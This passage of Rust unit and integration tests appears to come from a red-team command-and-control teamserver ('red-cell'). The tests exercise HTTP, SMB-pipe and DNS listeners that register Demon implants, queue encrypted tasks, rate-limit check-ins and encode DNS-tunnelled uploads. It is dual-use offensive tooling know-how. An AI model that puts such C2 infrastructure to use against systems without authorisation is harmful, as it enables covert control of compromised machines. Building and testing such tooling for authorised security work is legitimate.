            ))
            .send()
            .await?;

        assert_eq!(response.status(), StatusCode::OK);
        assert!(response.bytes().await?.is_empty());

        let updated =
            registry.get(agent_id).await.ok_or_else(|| "agent should still exist".to_owned())?;
        assert_eq!(updated.hostname, "wkstn-02");
        assert_eq!(updated.process_name, "cmd.exe");
        assert_eq!(updated.sleep_delay, 45);
        assert_eq!(updated.sleep_jitter, 5);
        assert_eq!(updated.encryption.aes_key, BASE64_STANDARD.encode(refreshed_key));
        assert_eq!(updated.encryption.aes_iv, BASE64_STANDARD.encode(refreshed_iv));
        assert_eq!(registry.ctr_offset(agent_id).await?, 0);
        assert_eq!(
            database
                .agents()
                .get(agent_id)
                .await?
                .ok_or_else(|| "agent should be persisted".to_owned())?
                .encryption
                .aes_key,
            updated.encryption.aes_key
        );

        let event = event_receiver
            .recv()
            .await
            .ok_or_else(|| "agent update event should broadcast".to_owned())?;
        let OperatorMessage::AgentUpdate(message) = event else {
            panic!("unexpected operator event");
        };
        assert_eq!(message.info.agent_id, format!("{agent_id:08X}"));
        assert_eq!(message.info.marked, "Alive");

        registry
            .enqueue_job(
                agent_id,
                Job {
                    command: u32::from(DemonCommand::CommandSleep),
                    request_id: 41,
                    payload: vec![1, 2, 3, 4],
                    command_line: "sleep 45 5".to_owned(),
                    task_id: "task-41".to_owned(),
                    created_at: "2026-03-12T18:00:00Z".to_owned(),
                    operator: "operator".to_owned(),
                },
            )
            .await?;

        let follow_up = Client::new()
            .post(format!("http://127.0.0.1:{port}/"))
            .body(valid_demon_callback_body(
                agent_id,
                refreshed_key,
                refreshed_iv,
                u32::from(DemonCommand::CommandGetJob),
                7,
                &[],
            ))
            .send()
            .await?;

        assert_eq!(follow_up.status(), StatusCode::OK);
        let bytes = follow_up.bytes().await?;
        let message = DemonMessage::from_bytes(bytes.as_ref())?;
        assert_eq!(message.packages.len(), 1);
        assert_eq!(message.packages[0].command_id, u32::from(DemonCommand::CommandSleep));
        assert_eq!(message.packages[0].request_id, 41);
        let decrypted = decrypt_agent_data_at_offset(
            &refreshed_key,
            &refreshed_iv,
            ctr_blocks_for_len(4),
            &message.packages[0].payload,
        )?;
        assert_eq!(decrypted, vec![1, 2, 3, 4]);

        manager.stop("edge-http-checkin").await?;
        Ok(())
    }

    #[tokio::test]
    async fn smb_listener_registers_demon_init_and_returns_framed_ack()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let manager =
            ListenerManager::new(database.clone(), registry.clone(), events.clone(), sockets, None);
        let mut event_receiver = events.subscribe();
        let pipe_name = unique_smb_pipe_name("init");

        manager.create(smb_listener("edge-smb-init", &pipe_name)).await?;
        manager.start("edge-smb-init").await?;
        wait_for_smb_listener(&pipe_name).await?;

        let key = [0x41; AGENT_KEY_LENGTH];
        let iv = [0x24; AGENT_IV_LENGTH];
        let mut stream = connect_smb_stream(&pipe_name).await?;
        write_test_smb_frame(
            &mut stream,
            0x1234_5678,
            &valid_demon_init_body(0x1234_5678, key, iv),
        )
        .await?;

        let (agent_id, response) = read_test_smb_frame(&mut stream).await?;
        assert_eq!(agent_id, 0x1234_5678);
        let decrypted = decrypt_agent_data(&key, &iv, &response)?;
        assert_eq!(decrypted.as_slice(), &0x1234_5678_u32.to_le_bytes());

        let stored = registry.get(0x1234_5678).await.expect("agent should be registered");
        assert_eq!(stored.hostname, "wkstn-01");
        assert_eq!(stored.external_ip, "127.0.0.1");
        assert_eq!(database.agents().get(0x1234_5678).await?, Some(stored.clone()));

        let event = event_receiver.recv().await.expect("agent registration should broadcast");
        let OperatorMessage::AgentNew(message) = event else {
            panic!("unexpected operator event");
        };
        assert_eq!(message.info.listener, "edge-smb-init");

        manager.stop("edge-smb-init").await?;
        Ok(())
    }

    #[tokio::test]
    async fn smb_listener_rate_limits_demon_init_per_source_ip()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let manager = ListenerManager::new(database, registry.clone(), events, sockets, None);
        let pipe_name = unique_smb_pipe_name("init-limit");

        manager.create(smb_listener("edge-smb-init-limit", &pipe_name)).await?;
        manager.start("edge-smb-init-limit").await?;
        wait_for_smb_listener(&pipe_name).await?;

        let mut stream = connect_smb_stream(&pipe_name).await?;
        for attempt in 0..MAX_DEMON_INIT_ATTEMPTS_PER_IP {
            let agent_id = 0x2000_0000 + attempt;
            write_test_smb_frame(
                &mut stream,
                agent_id,
                &valid_demon_init_body(agent_id, [0x41; AGENT_KEY_LENGTH], [0x24; AGENT_IV_LENGTH]),
            )
            .await?;

            let (response_agent_id, response) = read_test_smb_frame(&mut stream).await?;
            assert_eq!(response_agent_id, agent_id);
            assert!(!response.is_empty());
            assert!(registry.get(agent_id).await.is_some());
        }

        let blocked_agent_id = 0x2000_00FF;
        write_test_smb_frame(
            &mut stream,
            blocked_agent_id,
            &valid_demon_init_body(
                blocked_agent_id,
                [0x41; AGENT_KEY_LENGTH],
                [0x24; AGENT_IV_LENGTH],
            ),
        )
        .await?;

        let blocked =
            tokio::time::timeout(Duration::from_millis(250), read_test_smb_frame(&mut stream))
                .await;
        assert!(blocked.is_err(), "rate-limited SMB init should not receive an ack");
        assert!(registry.get(blocked_agent_id).await.is_none());

        manager.stop("edge-smb-init-limit").await?;
        Ok(())
    }

    #[tokio::test]
    async fn smb_listener_rejects_duplicate_full_init_for_registered_pivot_agent()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let manager =
            ListenerManager::new(database.clone(), registry.clone(), events.clone(), sockets, None);
        let mut event_receiver = events.subscribe();
        let pipe_name = unique_smb_pipe_name("pivot-init");
        let parent_id = 0x1111_2222;
        let parent_key = [0x31; AGENT_KEY_LENGTH];
        let parent_iv = [0x41; AGENT_IV_LENGTH];
        let child_id = 0x3333_4444;
        let child_key = [0x51; AGENT_KEY_LENGTH];
        let child_iv = [0x61; AGENT_IV_LENGTH];

        registry.insert(sample_agent_info(parent_id, parent_key, parent_iv)).await?;
        registry.insert(sample_agent_info(child_id, child_key, child_iv)).await?;
        registry.add_link(parent_id, child_id).await?;
        let stored_before = registry.get(child_id).await.expect("child agent should exist");
        let listener_before = registry.listener_name(child_id).await;
        let ctr_before = registry.ctr_offset(child_id).await?;

        manager.create(smb_listener("edge-smb-pivot-init", &pipe_name)).await?;
        manager.start("edge-smb-pivot-init").await?;
        wait_for_smb_listener(&pipe_name).await?;

        let mut stream = connect_smb_stream(&pipe_name).await?;
        write_test_smb_frame(
            &mut stream,
            child_id,
            &valid_demon_init_body(child_id, child_key, child_iv),
        )
        .await?;

        assert!(
            tokio::time::timeout(Duration::from_millis(250), read_test_smb_frame(&mut stream))
                .await
                .is_err(),
            "duplicate full init must not return an SMB ACK"
        );
        assert!(
            tokio::time::timeout(Duration::from_millis(250), event_receiver.recv()).await.is_err(),
            "duplicate full init must not broadcast AgentNew"
        );
        assert_eq!(registry.get(child_id).await, Some(stored_before));
        assert_eq!(registry.listener_name(child_id).await, listener_before);
        assert_eq!(registry.ctr_offset(child_id).await?, ctr_before);

        manager.stop("edge-smb-pivot-init").await?;
        Ok(())
    }

    #[tokio::test]
    async fn smb_listener_serializes_all_queued_jobs_for_get_job()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let manager = ListenerManager::new(database, registry.clone(), events, sockets, None);
        let pipe_name = unique_smb_pipe_name("jobs");
        let key = [0x61; AGENT_KEY_LENGTH];
        let iv = [0x27; AGENT_IV_LENGTH];
        let agent_id = 0x5566_7788;

        registry.insert(sample_agent_info(agent_id, key, iv)).await?;
        registry
            .enqueue_job(
                agent_id,
                Job {
                    command: u32::from(DemonCommand::CommandSleep),
                    request_id: 41,
                    payload: vec![1, 2, 3, 4],
                    command_line: "sleep 10".to_owned(),
                    task_id: "task-41".to_owned(),
                    created_at: "2026-03-09T20:10:00Z".to_owned(),
                    operator: "operator".to_owned(),
                },
            )
            .await?;
        registry
            .enqueue_job(
                agent_id,
                Job {
                    command: u32::from(DemonCommand::CommandCheckin),
                    request_id: 42,
                    payload: vec![5, 6, 7],
                    command_line: "checkin".to_owned(),
                    task_id: "task-42".to_owned(),
                    created_at: "2026-03-09T20:11:00Z".to_owned(),
                    operator: "operator".to_owned(),
                },
            )
            .await?;
        manager.create(smb_listener("edge-smb-jobs", &pipe_name)).await?;
        manager.start("edge-smb-jobs").await?;
        wait_for_smb_listener(&pipe_name).await?;

        let mut stream = connect_smb_stream(&pipe_name).await?;
        write_test_smb_frame(
            &mut stream,
            agent_id,
            &valid_demon_callback_body(
                agent_id,
                key,
                iv,
                u32::from(DemonCommand::CommandGetJob),
                9,
                &[],
            ),
        )
        .await?;

        let (response_agent_id, response_bytes) = read_test_smb_frame(&mut stream).await?;
        assert_eq!(response_agent_id, agent_id);
        let message = DemonMessage::from_bytes(response_bytes.as_ref())?;
        let response_ctr_offset = ctr_blocks_for_len(4);
        assert_eq!(message.packages.len(), 2);
        assert_eq!(message.packages[0].command_id, u32::from(DemonCommand::CommandSleep));
        assert_eq!(message.packages[0].request_id, 41);
        let pt0 = decrypt_agent_data_at_offset(
            &key,
            &iv,
            response_ctr_offset,
            &message.packages[0].payload,
        )?;
        assert_eq!(pt0, vec![1, 2, 3, 4]);
        assert_eq!(message.packages[1].command_id, u32::from(DemonCommand::CommandCheckin));
        assert_eq!(message.packages[1].request_id, 42);
        let pt1 = decrypt_agent_data_at_offset(
            &key,
            &iv,
            response_ctr_offset + ctr_blocks_for_len(message.packages[0].payload.len()),
            &message.packages[1].payload,
        )?;
        assert_eq!(pt1, vec![5, 6, 7]);
        assert!(registry.queued_jobs(agent_id).await?.is_empty());

        manager.stop("edge-smb-jobs").await?;
        Ok(())
    }

    #[test]
    fn operator_payload_maps_to_http_listener_config() -> Result<(), ListenerManagerError> {
        let info = ListenerInfo {
            name: Some("alpha".to_owned()),
            protocol: Some("Https".to_owned()),
            status: Some("Online".to_owned()),
            hosts: Some("a.example, b.example".to_owned()),
            host_bind: Some("0.0.0.0".to_owned()),
            host_rotation: Some("round-robin".to_owned()),
            port_bind: Some("8443".to_owned()),
            port_conn: Some("443".to_owned()),
            headers: Some("X-Test: true".to_owned()),
            uris: Some("/one, /two".to_owned()),
            user_agent: Some("Mozilla/5.0".to_owned()),
            secure: Some("true".to_owned()),
            ..ListenerInfo::default()
        };

        let config = listener_config_from_operator(&info)?;

        assert!(operator_requests_start(&info));
        match config {
            ListenerConfig::Http(config) => {
                assert_eq!(config.name, "alpha");
                assert!(config.secure);
                assert_eq!(config.hosts, vec!["a.example".to_owned(), "b.example".to_owned()]);
            }
            other => panic!("unexpected config: {other:?}"),
        }

        Ok(())
    }

    #[test]
    fn http_listener_operator_round_trip_preserves_advanced_settings()
    -> Result<(), ListenerManagerError> {
        let original = ListenerConfig::from(HttpListenerConfig {
            name: "edge".to_owned(),
            kill_date: Some("2026-03-09 20:00:00".to_owned()),
            working_hours: Some("08:00-17:00".to_owned()),
            hosts: vec!["a.example".to_owned(), "b.example".to_owned()],
            host_bind: "0.0.0.0".to_owned(),
            host_rotation: "round-robin".to_owned(),
            port_bind: 8443,
            port_conn: Some(443),
            method: Some("POST".to_owned()),
            behind_redirector: true,
            trusted_proxy_peers: vec!["127.0.0.1/32".to_owned(), "10.0.0.0/8".to_owned()],
            user_agent: Some("Mozilla/5.0".to_owned()),
            headers: vec!["X-Test: true".to_owned()],
            uris: vec!["/one".to_owned(), "/two".to_owned()],
            host_header: Some("team.example".to_owned()),
            secure: true,
            cert: Some(ListenerTlsConfig {
                cert: "/tmp/server.crt".to_owned(),
                key: "/tmp/server.key".to_owned(),
            }),
            response: Some(HttpListenerResponseConfig {
                headers: vec!["Server: nginx".to_owned()],
                body: Some("{\"status\":\"ok\"}".to_owned()),
            }),
            proxy: Some(HttpListenerProxyConfig {
                enabled: true,
                proxy_type: Some("http".to_owned()),
                host: "127.0.0.1".to_owned(),
                port: 8080,
                username: Some("user".to_owned()),
                password: Some("pass".to_owned()),
            }),
        });
        let summary = ListenerSummary {
            name: "edge".to_owned(),
            protocol: original.protocol(),
            state: PersistedListenerState { status: ListenerStatus::Created, last_error: None },
            config: original.clone(),
        };

        let info = summary.to_operator_info();
        let round_tripped = listener_config_from_operator(&info)?;

        assert_eq!(round_tripped, original);
        Ok(())
    }

    #[test]
    fn profile_listener_configs_preserve_http_host_header() {
        let profile = Profile::parse(
            r#"
            Teamserver {
              Host = "127.0.0.1"
              Port = 40056
            }

            Operators {
              user "neo" {
                Password = "password1234"
              }
            }

            Listeners {
              Http {
                Name = "edge"
                Hosts = ["listener.local"]
                HostBind = "127.0.0.1"
                HostRotation = "round-robin"
                PortBind = 8080
                HostHeader = "front.example"
              }
            }

            Demon {
              TrustXForwardedFor = true
              TrustedProxyPeers = ["127.0.0.1/32"]
            }
            "#,
        )
        .expect("profile should parse");

        let listeners = profile_listener_configs(&profile);

        assert_eq!(listeners.len(), 1);
        let ListenerConfig::Http(config) = &listeners[0] else {
            panic!("expected http listener");
        };
        assert_eq!(config.host_header.as_deref(), Some("front.example"));
        assert!(config.behind_redirector);
        assert_eq!(config.trusted_proxy_peers, vec!["127.0.0.1/32".to_owned()]);
    }

    #[test]
    fn smb_and_dns_listener_operator_round_trip_preserves_profile_timing()
    -> Result<(), ListenerManagerError> {
        let smb = ListenerConfig::from(SmbListenerConfig {
            name: "pivot".to_owned(),
            pipe_name: r"pivot-01".to_owned(),
            kill_date: Some("2026-03-09 20:00:00".to_owned()),
            working_hours: Some("08:00-17:00".to_owned()),
        });
        let dns = ListenerConfig::from(DnsListenerConfig {
            name: "dns-edge".to_owned(),
            host_bind: "0.0.0.0".to_owned(),
            port_bind: 53,
            domain: "c2.example".to_owned(),
            record_types: vec!["A".to_owned(), "TXT".to_owned()],
            kill_date: Some("2026-03-09 20:00:00".to_owned()),
            working_hours: Some("08:00-17:00".to_owned()),
        });

        for config in [smb, dns] {
            let summary = ListenerSummary {
                name: config.name().to_owned(),
                protocol: config.protocol(),
                state: PersistedListenerState { status: ListenerStatus::Stopped, last_error: None },
                config: config.clone(),
            };

            let info = summary.to_operator_info();
            let round_tripped = listener_config_from_operator(&info)?;
            assert_eq!(round_tripped, config);
        }

        Ok(())
    }

    #[test]
    fn operator_payload_maps_to_smb_listener_config() -> Result<(), ListenerManagerError> {
        let mut info = ListenerInfo {
            name: Some("pivot".to_owned()),
            protocol: Some("SMB".to_owned()),
            ..ListenerInfo::default()
        };
        info.extra.insert("PipeName".to_owned(), serde_json::json!(r"pivot-01"));

        let config = listener_config_from_operator(&info)?;
        match config {
            ListenerConfig::Smb(config) => {
                assert_eq!(config.name, "pivot");
                assert_eq!(config.pipe_name, "pivot-01");
            }
            other => panic!("unexpected config: {other:?}"),
        }

        Ok(())
    }

    #[test]
    fn mark_actions_accept_start_and_stop_aliases() -> Result<(), ListenerManagerError> {
        assert_eq!(action_from_mark("online")?, ListenerEventAction::Started);
        assert_eq!(action_from_mark("stop")?, ListenerEventAction::Stopped);
        assert!(matches!(
            action_from_mark("restart"),
            Err(ListenerManagerError::UnsupportedMark { .. })
        ));

        Ok(())
    }

    fn available_port() -> Result<u16, Box<dyn std::error::Error>> {
        let listener = StdTcpListener::bind("127.0.0.1:0")?;
        let port = listener.local_addr()?.port();
        drop(listener);
        Ok(port)
    }

    async fn wait_for_listener_status(
        manager: &ListenerManager,
        name: &str,
        expected: ListenerStatus,
    ) -> Result<(), ListenerManagerError> {
        for _ in 0..40 {
            if manager.summary(name).await?.state.status == expected {
                return Ok(());
            }
            sleep(Duration::from_millis(25)).await;
        }

        Err(ListenerManagerError::InvalidConfig {
            message: format!("listener `{name}` did not reach expected status {expected:?}"),
        })
    }

    async fn wait_for_listener(port: u16, secure: bool) -> Result<(), Box<dyn std::error::Error>> {
        let client = Client::builder().danger_accept_invalid_certs(true).build()?;
        let scheme = if secure { "https" } else { "http" };
        let url = format!("{scheme}://127.0.0.1:{port}/");

        for _ in 0..40 {
            match client.get(&url).send().await {
                Ok(_) => return Ok(()),
                Err(_) => sleep(Duration::from_millis(25)).await,
            }
        }

        Err(format!("listener on port {port} did not become ready").into())
    }

    async fn wait_for_smb_listener(pipe_name: &str) -> Result<(), Box<dyn std::error::Error>> {
        for _ in 0..40 {
            match connect_smb_stream(pipe_name).await {
                Ok(stream) => {
                    drop(stream);
                    return Ok(());
                }
                Err(_) => sleep(Duration::from_millis(25)).await,
            }
        }

        Err(format!("smb listener `{pipe_name}` did not become ready").into())
    }

    async fn connect_smb_stream(
        pipe_name: &str,
    ) -> Result<LocalSocketStream, Box<dyn std::error::Error>> {
        let socket_name = smb_local_socket_name(pipe_name)?;
        Ok(LocalSocketStream::connect(socket_name).await?)
    }

    async fn connected_smb_stream_pair(
        pipe_name: &str,
    ) -> Result<(LocalSocketStream, LocalSocketStream), Box<dyn std::error::Error>> {
        let socket_name = smb_local_socket_name(pipe_name)?;
        let listener = ListenerOptions::new().name(socket_name).create_tokio()?;
        let server = tokio::spawn(async move { listener.accept().await });
        let client = connect_smb_stream(pipe_name).await?;
        let server = server.await??;
        Ok((client, server))
    }

    async fn write_test_smb_frame(
        stream: &mut LocalSocketStream,
        agent_id: u32,
        payload: &[u8],
    ) -> Result<(), Box<dyn std::error::Error>> {
        stream.write_u32_le(agent_id).await?;
        stream.write_u32_le(u32::try_from(payload.len())?).await?;
        stream.write_all(payload).await?;
        stream.flush().await?;
        Ok(())
    }

    async fn read_test_smb_frame(
        stream: &mut LocalSocketStream,
    ) -> Result<(u32, Vec<u8>), Box<dyn std::error::Error>> {
        let agent_id = stream.read_u32_le().await?;
        let payload_len = usize::try_from(stream.read_u32_le().await?)?;
        let mut payload = vec![0_u8; payload_len];
        stream.read_exact(&mut payload).await?;
        Ok((agent_id, payload))
    }

    #[tokio::test]
    async fn read_smb_frame_rejects_payloads_over_limit() -> Result<(), Box<dyn std::error::Error>>
    {
        let pipe_name = unique_smb_pipe_name("oversize");
        let (mut client, mut server) = connected_smb_stream_pair(&pipe_name).await?;
        let oversized_len = u32::try_from(MAX_SMB_FRAME_PAYLOAD_LEN + 1)?;

        client.write_u32_le(0x1234_5678).await?;
        client.write_u32_le(oversized_len).await?;
        client.flush().await?;

        let error =
            read_smb_frame(&mut server).await.expect_err("oversized frame should be rejected");
        assert_eq!(error.kind(), io::ErrorKind::InvalidData);
        assert!(error.to_string().contains("exceeds maximum"), "unexpected error message: {error}");

        Ok(())
    }

    fn unique_smb_pipe_name(suffix: &str) -> String {
        let unique = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .map(|duration| duration.as_nanos())
            .unwrap_or_default();
        format!("red-cell-test-{suffix}-{unique}")
    }

    fn valid_demon_request_body(agent_id: u32) -> Vec<u8> {
        let payload = [
            u32::from(DemonCommand::DemonInit).to_be_bytes().as_slice(),
            7_u32.to_be_bytes().as_slice(),
        ]
        .concat();

        DemonEnvelope::new(agent_id, payload)
            .unwrap_or_else(|error| {
                panic!("failed to build valid demon request body: {error}");
            })
            .to_bytes()
    }

    fn sample_agent_info(
        agent_id: u32,
        key: [u8; AGENT_KEY_LENGTH],
        iv: [u8; AGENT_IV_LENGTH],
    ) -> red_cell_common::AgentInfo {
        red_cell_common::AgentInfo {
            agent_id,
            active: true,
            reason: String::new(),
            note: String::new(),
            encryption: AgentEncryptionInfo {
                aes_key: BASE64_STANDARD.encode(key),
                aes_iv: BASE64_STANDARD.encode(iv),
            },
            hostname: "wkstn-01".to_owned(),
            username: "operator".to_owned(),
            domain_name: "REDCELL".to_owned(),
            external_ip: "203.0.113.10".to_owned(),
            internal_ip: "10.0.0.25".to_owned(),
            process_name: "explorer.exe".to_owned(),
            base_address: 0x401000,
            process_pid: 1337,
            process_tid: 1338,
            process_ppid: 512,
            process_arch: "x64".to_owned(),
            elevated: true,
            os_version: "Windows 11".to_owned(),
            os_arch: "x64".to_owned(),
            sleep_delay: 15,
            sleep_jitter: 20,
            kill_date: Some(1_893_456_000),
            working_hours: Some(0b101010),
            first_call_in: "2026-03-09T19:00:00Z".to_owned(),
            last_call_in: "2026-03-09T19:01:00Z".to_owned(),
        }
    }

    fn valid_demon_init_body(
        agent_id: u32,
        key: [u8; AGENT_KEY_LENGTH],
        iv: [u8; AGENT_IV_LENGTH],
    ) -> Vec<u8> {
        let mut metadata = Vec::new();
        metadata.extend_from_slice(&agent_id.to_be_bytes());
        add_length_prefixed_bytes(&mut metadata, b"wkstn-01");
        add_length_prefixed_bytes(&mut metadata, b"operator");
        add_length_prefixed_bytes(&mut metadata, b"REDCELL");
        add_length_prefixed_bytes(&mut metadata, b"10.0.0.25");
        add_length_prefixed_utf16(&mut metadata, "C:\\Windows\\explorer.exe");
        metadata.extend_from_slice(&1337_u32.to_be_bytes());
        metadata.extend_from_slice(&1338_u32.to_be_bytes());
        metadata.extend_from_slice(&512_u32.to_be_bytes());
        metadata.extend_from_slice(&2_u32.to_be_bytes());
        metadata.extend_from_slice(&1_u32.to_be_bytes());
        metadata.extend_from_slice(&0x401000_u64.to_be_bytes());
        metadata.extend_from_slice(&10_u32.to_be_bytes());
        metadata.extend_from_slice(&0_u32.to_be_bytes());
        metadata.extend_from_slice(&1_u32.to_be_bytes());
        metadata.extend_from_slice(&0_u32.to_be_bytes());
        metadata.extend_from_slice(&22000_u32.to_be_bytes());
        metadata.extend_from_slice(&9_u32.to_be_bytes());
        metadata.extend_from_slice(&15_u32.to_be_bytes());
        metadata.extend_from_slice(&20_u32.to_be_bytes());
        metadata.extend_from_slice(&1_893_456_000_u64.to_be_bytes());
        metadata.extend_from_slice(&0b101010_u32.to_be_bytes());

        let encrypted = red_cell_common::crypto::encrypt_agent_data(&key, &iv, &metadata)
            .expect("metadata encryption should succeed");
        let payload = [
            u32::from(DemonCommand::DemonInit).to_be_bytes().as_slice(),
            7_u32.to_be_bytes().as_slice(),
            key.as_slice(),
            iv.as_slice(),
            encrypted.as_slice(),
        ]
        .concat();

        DemonEnvelope::new(agent_id, payload)
            .unwrap_or_else(|error| panic!("failed to build demon init request body: {error}"))
            .to_bytes()
    }

    fn valid_demon_callback_body(
        agent_id: u32,
        key: [u8; AGENT_KEY_LENGTH],
        iv: [u8; AGENT_IV_LENGTH],
        command_id: u32,
        request_id: u32,
        payload: &[u8],
    ) -> Vec<u8> {
        valid_demon_multi_callback_body(
            agent_id,
            key,
            iv,
            (command_id, request_id, payload.to_vec()),
            &[],
        )
    }

    fn valid_demon_multi_callback_body(
        agent_id: u32,
        key: [u8; AGENT_KEY_LENGTH],
        iv: [u8; AGENT_IV_LENGTH],
        first: (u32, u32, Vec<u8>),
        additional: &[(u32, u32, Vec<u8>)],
    ) -> Vec<u8> {
        let mut decrypted = Vec::new();
        decrypted
            .extend_from_slice(&u32::try_from(first.2.len()).unwrap_or_default().to_be_bytes());
        decrypted.extend_from_slice(&first.2);

        for (command_id, request_id, payload) in additional {
            decrypted.extend_from_slice(&command_id.to_be_bytes());
            decrypted.extend_from_slice(&request_id.to_be_bytes());
            decrypted
                .extend_from_slice(&u32::try_from(payload.len()).unwrap_or_default().to_be_bytes());
            decrypted.extend_from_slice(payload);
        }

        let encrypted =
            encrypt_agent_data(&key, &iv, &decrypted).expect("callback encryption should succeed");
        let payload = [
            first.0.to_be_bytes().as_slice(),
            first.1.to_be_bytes().as_slice(),
            encrypted.as_slice(),
        ]
        .concat();

        DemonEnvelope::new(agent_id, payload)
            .unwrap_or_else(|error| panic!("failed to build demon callback request body: {error}"))
            .to_bytes()
    }

    fn add_length_prefixed_bytes(buf: &mut Vec<u8>, bytes: &[u8]) {
        buf.extend_from_slice(&u32::try_from(bytes.len()).unwrap_or_default().to_be_bytes());
        buf.extend_from_slice(bytes);
    }

    fn add_length_prefixed_utf16(buf: &mut Vec<u8>, value: &str) {
        let encoded: Vec<u8> = value.encode_utf16().flat_map(u16::to_le_bytes).collect();
        add_length_prefixed_bytes(buf, &encoded);
    }

    fn add_checkin_u32(buf: &mut Vec<u8>, value: u32) {
        buf.extend_from_slice(&value.to_le_bytes());
    }

    fn add_checkin_u64(buf: &mut Vec<u8>, value: u64) {
        buf.extend_from_slice(&value.to_le_bytes());
    }

    fn add_checkin_bytes(buf: &mut Vec<u8>, bytes: &[u8]) {
        add_checkin_u32(buf, u32::try_from(bytes.len()).unwrap_or_default());
        buf.extend_from_slice(bytes);
    }

    fn add_checkin_utf16(buf: &mut Vec<u8>, value: &str) {
        let mut encoded: Vec<u8> = value.encode_utf16().flat_map(u16::to_le_bytes).collect();
        encoded.extend_from_slice(&[0, 0]);
        add_checkin_bytes(buf, &encoded);
    }

    fn sample_checkin_metadata_payload(
        agent_id: u32,
        key: [u8; AGENT_KEY_LENGTH],
        iv: [u8; AGENT_IV_LENGTH],
    ) -> Vec<u8> {
        let mut payload = Vec::new();
        payload.extend_from_slice(&key);
        payload.extend_from_slice(&iv);
        add_checkin_u32(&mut payload, agent_id);
        add_checkin_bytes(&mut payload, b"wkstn-02");
        add_checkin_bytes(&mut payload, b"svc-op");
        add_checkin_bytes(&mut payload, b"research");
        add_checkin_bytes(&mut payload, b"10.10.10.50");
        add_checkin_utf16(&mut payload, "C:\\Windows\\System32\\cmd.exe");
        add_checkin_u32(&mut payload, 4040);
        add_checkin_u32(&mut payload, 5050);
        add_checkin_u32(&mut payload, 3030);
        add_checkin_u32(&mut payload, 1);
        add_checkin_u32(&mut payload, 0);
        add_checkin_u64(&mut payload, 0x401000);
        add_checkin_u32(&mut payload, 10);
        add_checkin_u32(&mut payload, 0);
        add_checkin_u32(&mut payload, 1);
        add_checkin_u32(&mut payload, 0);
        add_checkin_u32(&mut payload, 22_621);
        add_checkin_u32(&mut payload, 9);
        add_checkin_u32(&mut payload, 45);
        add_checkin_u32(&mut payload, 5);
        add_checkin_u64(&mut payload, 1_725_000_000);
        add_checkin_u32(&mut payload, 0x00FF_00FF);
        payload
    }

    fn dns_upload_qname(agent_id: u32, seq: u16, total: u16, chunk: &[u8], domain: &str) -> String {
        format!("{}.{seq:x}-{total:x}-{agent_id:08x}.up.{domain}", base32hex_encode(chunk))
    }

    fn parse_dns_txt_answer(packet: &[u8]) -> Option<String> {
        if packet.len() < DNS_HEADER_LEN {
            return None;
        }

        let mut pos = DNS_HEADER_LEN;
        while pos < packet.len() {
            let len = usize::from(packet[pos]);
            pos += 1;
            if len == 0 {
                break;
            }
            pos = pos.checked_add(len)?;
        }

        pos = pos.checked_add(4)?;
        pos = pos.checked_add(2 + 2 + 2 + 4 + 2)?;
        let txt_len = usize::from(*packet.get(pos)?);
        let start = pos.checked_add(1)?;
        let end = start.checked_add(txt_len)?;
        std::str::from_utf8(packet.get(start..end)?).ok().map(str::to_owned)
    }

    // ── DNS C2 unit tests ─────────────────────────────────────────────────────
    use tokio::net::UdpSocket as TokioUdpSocket;

    fn free_udp_port() -> u16 {
        // Bind on :0 to let the OS pick an ephemeral port, then return it.
        let sock =
            std::net::UdpSocket::bind("127.0.0.1:0").expect("failed to bind ephemeral UDP socket");
        sock.local_addr().expect("failed to read local addr").port()
    }

    fn dns_listener_config(name: &str, port: u16, domain: &str) -> ListenerConfig {
        ListenerConfig::from(red_cell_common::DnsListenerConfig {
            name: name.to_owned(),
            host_bind: "127.0.0.1".to_owned(),
            port_bind: port,
            domain: domain.to_owned(),
            record_types: vec!["TXT".to_owned()],
            kill_date: None,
            working_hours: None,
        })
    }

    async fn dns_state(name: &str) -> DnsListenerState {
        let database = Database::connect_in_memory().await.expect("database creation failed");
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let config = red_cell_common::DnsListenerConfig {
            name: name.to_owned(),
            host_bind: "127.0.0.1".to_owned(),
            port_bind: 0,
            domain: "c2.example.com".to_owned(),
            record_types: vec!["TXT".to_owned()],
            kill_date: None,
            working_hours: None,
        };

        DnsListenerState::new(
            &config,
            registry,
            events,
            database,
            sockets,
            None,
            DemonInitRateLimiter::new(),
            ShutdownController::new(),
            super::DEFAULT_MAX_DOWNLOAD_BYTES,
        )
    }

    async fn spawn_test_dns_listener(
        config: red_cell_common::DnsListenerConfig,
    ) -> (JoinHandle<()>, AgentRegistry) {
        let database = Database::connect_in_memory().await.expect("database creation failed");
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let runtime = spawn_dns_listener_runtime(
            &config,
            registry.clone(),
            events,
            database,
            sockets,
            None,
            DemonInitRateLimiter::new(),
            ShutdownController::new(),
            super::DEFAULT_MAX_DOWNLOAD_BYTES,
        )
        .await
        .expect("dns runtime should start");
        let handle = tokio::spawn(async move {
            let _ = runtime.await;
        });

        (handle, registry)
    }

    /// Build a minimal DNS query packet for `qname`.
    fn build_dns_query(id: u16, qname: &str, qtype: u16) -> Vec<u8> {
        let mut buf = Vec::new();
        // Header
        buf.extend_from_slice(&id.to_be_bytes());
        buf.extend_from_slice(&0x0100u16.to_be_bytes()); // flags: QR=0, RD=1
        buf.extend_from_slice(&1u16.to_be_bytes()); // qdcount
        buf.extend_from_slice(&0u16.to_be_bytes()); // ancount
        buf.extend_from_slice(&0u16.to_be_bytes()); // nscount
        buf.extend_from_slice(&0u16.to_be_bytes()); // arcount
        // QNAME
